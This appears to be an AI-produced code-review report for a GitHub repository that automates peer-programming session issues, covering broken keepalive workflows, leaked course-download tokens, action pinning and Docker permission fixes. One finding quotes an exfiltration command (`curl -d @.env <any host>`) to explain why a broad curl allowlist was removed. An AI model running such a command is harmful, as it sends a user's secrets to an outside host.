# Code Review — 2026-06-10

Systematic review (multi-agent, all findings adversarially verified). Fixes applied directly unless marked **USER ACTION**.

## Critical / Outage

| # | Finding | Status |
|---|---------|--------|
| 1 | Both workflows in state `disabled_inactivity` since ~May 20 — no session issues for May 27, Jun 3, Jun 10 | Fixed 2026-06-10: re-enabled via `gh api -X PUT .../enable`; both `active`. New keepalive dispatched and verified (run succeeded, both timers reset) |
| 2 | `keepalive.yml` used `gautamkrishnar/keepalive-workflow@v2`, whose repo was TOS-blocked by GitHub on 2025-04-21 — *before the workflow was added*. All 6 runs failed at "Set up job"; the keepalive never worked once | Fixed: rewritten as a first-party `curl PUT .../actions/workflows/{file}/enable` step |
| 3 | Even if the action had worked: v2 API mode only keeps alive the workflow it runs in (no `workflow_files:` input was set), so `create-session-issues.yml` was never covered; and `time_elapsed: 45` + 1st/21st cron loses the race (first eligible run at day ~63 > 60) | Fixed: replacement re-enables **both** workflows unconditionally every run |

## Security

| # | Finding | Status |
|---|---------|--------|
| 4 | `Peer Mentor SOP.docx` embeds two **live** GoHighLevel/Firebase bearer-token download URLs (`cdn.apisystem.tech/...?alt=media&token=...`) for membership-gated course PDFs, in a public repo (verified fetchable unauthenticated, HTTP 200). Tokens also persist in git history (commit acc163b) | **USER ACTION**: rotate/invalidate the tokens on the GoHighLevel side (re-upload assets), then optionally regenerate the docx with portal links |
| 5 | `.claude/settings.local.json` allowlisted `Bash(curl:*)` — auto-approves any curl, including data exfiltration (`curl -d @.env <any host>`), and prefix-matching is not a security boundary | Fixed: entry removed (re-add a narrower rule if prompts get noisy) |
| 6 | `actions/github-script@v7` referenced by mutable tag | Fixed: pinned to SHA `f28e40c…` (v7.1.0, verified via `git ls-remote`) |
| 7 | `specify` installed spec-kit from unpinned default-branch HEAD | Fixed: pinned `SPEC_KIT_REF=v0.9.5` (bump deliberately) |
| 8 | Secrets sweep: `.env` untracked + gitignored + absent from history; no other credentials in tracked files; workflow permissions already least-privilege | Clean |

## Workflow robustness

| # | Finding | Status |
|---|---------|--------|
| 9 | Hour-based DST gate was delay-fragile: GitHub cron delays of ≥45 min would silently skip a week (observed start delays 17–42 min; May 20 ran 3 min from cutoff), and an EST-cron delay into hour 15 could double-create issues | Fixed: gate now matches `github.event.schedule` against the current ET UTC offset — delay-immune, duplicate-proof |
| 10 | Stale "3:45 PM ET" comment in workflow + CLAUDE.md (schedule moved to 3:15 in 32ee505); unused `eastern_hour` output; keepalive "every 50 days" comment vs twice-monthly cron | Fixed |
| 11 | `target="_blank"` in issue-body/README anchors is stripped by GitHub's HTML sanitizer (links work, new-tab doesn't) | Accepted as-is (inert, cosmetic) |

## Content drift (canonical = workflow issue bodies)

| # | Finding | Status |
|---|---------|--------|
| 12 | README announcement code blocks missing the voice-channel URL line (+ trailing colons) | Fixed |
| 13 | `peer-programming.md` template missing voice-channel URLs **and** the "Log into Asana" step | Fixed |
| 14 | Issue #51 (today's manual issue) titled "… - [DATE]" | Fixed via API → "Peer Programming Session - June 10, 2026" |

## Shell / Docker (`specify`, `docker-compose.yml`)

| # | Finding | Status |
|---|---------|--------|
| 15 | No `set -e`; failed install left a partial root-owned `.speckit/` that blocked reinstall forever; update branch always exited 0 | Fixed: `set -euo pipefail`, guard tests the binary not the dir, failure cleans up and exits 1 |
| 16 | `docker run -v .:/workspace … rm -rf` resolved `.` to the **caller's cwd** — running `specify update` from elsewhere root-deleted that directory's `.speckit`/`.specify` | Fixed: script `cd`s to its own dir; root-container rm hack removed entirely |
| 17 | Container ran as root → everything written through the bind mount (incl. tracked `.claude/commands/*`) became root-owned, unremovable without sudo | Fixed: committed `Dockerfile` (git+uv baked in), compose `user: "${HOST_UID:-1000}:${HOST_GID:-1000}"`, wrapper exports HOST_UID/GID. Verified: non-root install of spec-kit v0.9.5 works, files host-owned, host `rm -rf` works |
| 18 | Install/init commands duplicated verbatim in two branches | Fixed: extracted `install_speckit()` / `init_project()` |

## Test coverage

No package.json / test runner exists (docs + automation repo). Validation performed instead: `bash -n` + shellcheck (0 issues) on `specify`; YAML parse on all three YAML files; Docker build + live non-root install/run/cleanup of SpecKit; workflow gate logic traced for both DST regimes.

## Remaining user actions

1. **Rotate the two GoHighLevel download tokens** embedded in `Peer Mentor SOP.docx` (they bypass the membership paywall, are public, persist in git history, and were re-verified live — HTTP 200 — on 2026-06-10). Rotation happens in the GoHighLevel admin (re-uploading the two PDFs generates new tokens); no credential available to automation can do this.

~~Re-enable workflows~~ — done 2026-06-10 via gh CLI (classic `repo`-scope token); verified `active` + successful keepalive run.
~~Commit & push~~ — done 2026-06-10 (54dbceb), 60-day clock reset.
